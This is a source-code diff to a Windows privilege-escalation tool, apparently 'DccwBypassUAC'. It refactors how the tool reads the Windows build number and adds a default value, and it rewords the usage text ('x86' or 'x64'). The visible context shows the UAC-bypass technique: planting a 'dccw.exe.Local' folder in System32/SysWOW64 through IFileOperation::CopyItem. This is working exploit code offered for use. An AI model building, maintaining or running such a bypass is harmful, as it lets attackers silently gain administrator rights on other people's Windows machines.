@@ -384,30 +384,36 @@ BOOL createDirectories(LPCTSTR targetedDirectories) {
 	return success;
 }
 
-std::wstring ReadRegValue(HKEY root, std::wstring key, std::wstring name) {
+std::wstring getBuildNumber() {
+	HKEY root = HKEY_LOCAL_MACHINE;
+	std::wstring key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
+	std::wstring name = L"CurrentBuild";
 	HKEY hKey;
-	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
-		throw "Could not open registry key";
+	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...");
+		return L"7000";
+	}
 
 	DWORD type;
 	DWORD cbData;
 	if (RegQueryValueEx(hKey, name.c_str(), NULL, &type, NULL, &cbData) != ERROR_SUCCESS)
 	{
 		RegCloseKey(hKey);
-		throw "Could not read registry value";
+		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...");
+		return L"7000";
 	}
 
-	if (type != REG_SZ)
-	{
+	if (type != REG_SZ) {
 		RegCloseKey(hKey);
-		throw "Incorrect registry value type";
+		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...");
+		return L"7000";
 	}
 
 	std::wstring value(cbData / sizeof(wchar_t), L'\0');
-	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value[0]), &cbData) != ERROR_SUCCESS)
-	{
+	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value[0]), &cbData) != ERROR_SUCCESS)	{
 		RegCloseKey(hKey);
-		throw "Could not read registry value";
+		wprintf(L"Error! The Windows build number cannot be determined! Trying the default one...");
+		return L"7000";
 	}
 
 	RegCloseKey(hKey);
@@ -581,7 +587,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	if (argc == 2) {
 
-		std::wstring buildVersion = ReadRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuild");
+		std::wstring buildVersion = getBuildNumber();
 
 		if (std::stoi(buildVersion) >= 7000) {
 			HANDLE hToken;
@@ -628,9 +634,10 @@ int wmain(int argc, wchar_t* argv[]) {
 										folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
 									}
 									else {
-										wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
-										wprintf(L" For example : \n");
+										wprintf(L" [-] Error! You must specify the target architecture: \"x86\" or \"x64\".\n");
+										wprintf(L" For example: \n");
 										wprintf(L" > DccwBypassUAC.exe x86\n");
+										wprintf(L" > DccwBypassUAC.exe x64\n");
 										return 1;
 									}
 
@@ -664,7 +671,7 @@ int wmain(int argc, wchar_t* argv[]) {
 									hFind = FindFirstFile(folderName, &FindFileData);
 									if (hFind == INVALID_HANDLE_VALUE) {
 										wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
-										removeFilesAndDirectories(targetedDirectories);
+										IFileOperationDelete(destPath, buildVersion);
 										return 1;
 									}
 									else {
@@ -695,8 +702,8 @@ int wmain(int argc, wchar_t* argv[]) {
 		}
 	}
 	else {
-		wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
-		wprintf(L" For example : \n");
+		wprintf(L" [-] Error! You must specify the target architecture: \"x86\" or \"x64\".\n");
+		wprintf(L" For example: \n");
 		wprintf(L" > DccwBypassUAC.exe x86\n");
 		wprintf(L" > DccwBypassUAC.exe x64\n");
 	}
